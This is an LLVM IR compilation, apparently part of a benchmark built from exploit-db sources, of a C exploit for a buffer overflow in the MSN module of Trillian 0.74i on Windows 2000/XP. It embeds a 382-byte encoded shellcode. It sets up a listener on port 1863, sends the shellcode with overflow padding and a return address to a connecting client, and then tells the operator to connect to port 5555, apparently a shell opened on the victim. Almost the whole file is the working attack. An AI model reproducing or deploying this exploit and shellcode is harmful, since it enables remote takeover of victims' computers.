; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_24584.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_24584.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@__const.main.shellcode = private unnamed_addr constant [382 x i8] c"\EB\10ZJ3\C9f\B9f\01\804\0A\99\E2\FA\EB\05\E8\EB\FF\FF\FFp\99\98\99\99\C3\FD\12\D8\A9\12\D9\95\12\E9\854\12\D9\91\12A\12\EA\A5\9Aj\12\EF\E1\9Aj\12\E7\B9\9Ab\12\D7\8D\AAt\CF\CE\C8\12\A6\9Ab\12k\F3\97\C0j?\ED\91\C0\C6\1A^\9D\DC{p\C0\C6\C7\12T\12\DF\BD\9AZHx\9AX\AAP\FF\12\91\12\DF\85\9AZXx\9B\9AX\12\99\9AZ\12c\12n\1A_\97\12I\F3\9A\C0q\E5\99\99\99\1A_\94\CB\CFf\CEe\C3\12A\F3\9D\C0q\F0\99\99\99\C9\C9\C9\C9\F3\98\F3\9Bf\CEi\12A^\9E\9B\99\8C*\AAY\10\DE\9D\F3\89\CE\CAf\CEm\F3\98\CAf\CEa\C9\C9\CAf\CEe\1Au\DD\12m\AAB\F3\89\C0\10\85\17{b\10\DF\A1\10\DF\A5\10\DF\D9^\DF\B5\98\98\99\99\14\DE\89\C9\CF\CA\CA\CA\F3\98\CA\CA^\DE\A5\FA\F4\FD\99\14\DE\A5\C9\CAf\CE}\C9f\CEq\AAY5\1CY\EC`\C8\CB\CF\CAfK\C3\C02{w\AAYZqbgff\DE\FC\ED\C9\EB\F6\FA\D8\FD\FD\EB\FC\EA\EA\99\DA\EB\FC\F8\ED\FC\C9\EB\F6\FA\FC\EA\EA\D8\99\DC\E1\F0\ED\C9\EB\F6\FA\FC\EA\EA\99\D5\F6\F8\FD\D5\F0\FB\EB\F8\EB\E0\D8\99\EE\EA\AB\C6\AA\AB\99\CE\CA\D8\CA\F6\FA\F2\FC\ED\D8\99\FB\F0\F7\FD\99\F5\F0\EA\ED\FC\F7\99\F8\FA\FA\FC\E9\ED\99\00", align 16
@.str = private unnamed_addr constant [75 x i8] c"------------------------------------------------------------------------\0D\0A\00", align 1
@.str.1 = private unnamed_addr constant [75 x i8] c"-  Cerulean Studios Trillian 0.74i MSN module Buffer Overflow exploit  -\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [75 x i8] c"-                   for Windows 2000 / Windows XP                      -\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [75 x i8] c"-                                                                      -\0D\0A\00", align 1
@.str.4 = private unnamed_addr constant [75 x i8] c"-         created by Komrade  -  http://unsecure.altervista.org        -\0D\0A\00", align 1
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [32 x i8] c"\0D\0AWaiting for a connection...\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [33 x i8] c"Unable to wait for connections\0D\0A\00", align 1
@.str.7 = private unnamed_addr constant [29 x i8] c"Error receving connections\0D\0A\00", align 1
@.str.8 = private unnamed_addr constant [47 x i8] c"Received a connection request from a client.\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [28 x i8] c"Exploit sent succesfully.\0D\0A\00", align 1
@.str.10 = private unnamed_addr constant [28 x i8] c"Now connect to port 5555.\0D\0A\00", align 1
@.str.11 = private unnamed_addr constant [28 x i8] c"Error sending the exploit\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [382 x i8], align 16
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [4096 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %17 = bitcast [382 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %17, i8* align 16 getelementptr inbounds ([382 x i8], [382 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 382, i1 false)
  %18 = call i32 @MAKEWORD(i32 2, i32 0)
  store i32 %18, i32* %12, align 4
  %19 = load i32, i32* %12, align 4
  %20 = call i32 @WSAStartup(i32 %19, i32* %11)
  %21 = call i32 @printf(i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str, i64 0, i64 0))
  %22 = call i32 @printf(i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.1, i64 0, i64 0))
  %23 = call i32 @printf(i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.2, i64 0, i64 0))
  %24 = call i32 @printf(i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.3, i64 0, i64 0))
  %25 = call i32 @printf(i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.4, i64 0, i64 0))
  %26 = call i32 @printf(i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str, i64 0, i64 0))
  %27 = load i32, i32* @PF_INET, align 4
  %28 = load i32, i32* @SOCK_STREAM, align 4
  %29 = call i64 @socket(i32 %27, i32 %28, i32 0)
  store i64 %29, i64* %7, align 8
  %30 = load i32, i32* @PF_INET, align 4
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  store i32 %30, i32* %31, align 4
  %32 = call i32 @htons(i32 1863)
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i32 %32, i32* %33, align 4
  %34 = load i32, i32* @INADDR_ANY, align 4
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %36 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %35, i32 0, i32 0
  store i32 %34, i32* %36, align 4
  %37 = load i64, i64* %7, align 8
  %38 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %39 = call i32 @bind(i64 %37, %struct.sockaddr* %38, i32 12)
  %40 = load i64, i64* %7, align 8
  %41 = call i32 @listen(i64 %40, i32 1)
  store i32 4, i32* %14, align 4
  %42 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.5, i64 0, i64 0))
  %43 = load i64, i64* %7, align 8
  %44 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %45 = call i64 @accept(i64 %43, %struct.sockaddr* %44, i32* %14)
  store i64 %45, i64* %8, align 8
  %46 = load i64, i64* %8, align 8
  %47 = icmp sle i64 %46, 0
  br i1 %47, label %48, label %51

48:                                               ; preds = %2
  %49 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.6, i64 0, i64 0))
  %50 = call i32 @exit(i32 -1) #4
  unreachable

51:                                               ; preds = %2
  %52 = load i64, i64* %8, align 8
  %53 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 0
  %54 = call i32 @recv(i64 %52, i8* %53, i32 4096, i32 0)
  store i32 %54, i32* %15, align 4
  %55 = load i32, i32* %15, align 4
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %57, label %60

57:                                               ; preds = %51
  %58 = call i32 @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.7, i64 0, i64 0))
  %59 = call i32 @exit(i32 -1) #4
  unreachable

60:                                               ; preds = %51
  %61 = call i32 @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.8, i64 0, i64 0))
  %62 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 0
  %63 = getelementptr inbounds [382 x i8], [382 x i8]* %6, i64 0, i64 0
  %64 = call i32 @strcpy(i8* %62, i8* %63)
  %65 = getelementptr inbounds [382 x i8], [382 x i8]* %6, i64 0, i64 0
  %66 = call i32 @strlen(i8* %65)
  store i32 %66, i32* %16, align 4
  br label %67

67:                                               ; preds = %74, %60
  %68 = load i32, i32* %16, align 4
  %69 = icmp slt i32 %68, 4090
  br i1 %69, label %70, label %77

70:                                               ; preds = %67
  %71 = load i32, i32* %16, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %72
  store i8 120, i8* %73, align 1
  br label %74

74:                                               ; preds = %70
  %75 = load i32, i32* %16, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %16, align 4
  br label %67

77:                                               ; preds = %67
  %78 = load i32, i32* %16, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %79
  store i8 51, i8* %80, align 1
  %81 = load i32, i32* %16, align 4
  %82 = add nsw i32 %81, 1
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %83
  store i8 18, i8* %84, align 1
  %85 = load i32, i32* %16, align 4
  %86 = add nsw i32 %85, 2
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %87
  store i8 64, i8* %88, align 1
  %89 = load i32, i32* %16, align 4
  %90 = add nsw i32 %89, 3
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %91
  store i8 13, i8* %92, align 1
  %93 = load i32, i32* %16, align 4
  %94 = add nsw i32 %93, 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %95
  store i8 10, i8* %96, align 1
  %97 = load i32, i32* %16, align 4
  %98 = add nsw i32 %97, 5
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %99
  store i8 0, i8* %100, align 1
  %101 = load i64, i64* %8, align 8
  %102 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 0
  %103 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 0
  %104 = call i32 @strlen(i8* %103)
  %105 = call i32 @send(i64 %101, i8* %102, i32 %104, i32 0)
  store i32 %105, i32* %15, align 4
  %106 = load i32, i32* %15, align 4
  %107 = icmp sgt i32 %106, 0
  br i1 %107, label %108, label %111

108:                                              ; preds = %77
  %109 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.9, i64 0, i64 0))
  %110 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.10, i64 0, i64 0))
  br label %113

111:                                              ; preds = %77
  %112 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.11, i64 0, i64 0))
  br label %113

113:                                              ; preds = %111, %108
  %114 = load i64, i64* %8, align 8
  %115 = call i32 @closesocket(i64 %114)
  %116 = load i64, i64* %7, align 8
  %117 = call i32 @closesocket(i64 %116)
  %118 = call i32 (...) @WSACleanup()
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @MAKEWORD(i32, i32) #2

declare dso_local i32 @WSAStartup(i32, i32*) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i64 @socket(i32, i32, i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @bind(i64, %struct.sockaddr*, i32) #2

declare dso_local i32 @listen(i64, i32) #2

declare dso_local i64 @accept(i64, %struct.sockaddr*, i32*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @recv(i64, i8*, i32, i32) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @send(i64, i8*, i32, i32) #2

declare dso_local i32 @closesocket(i64) #2

declare dso_local i32 @WSACleanup(...) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
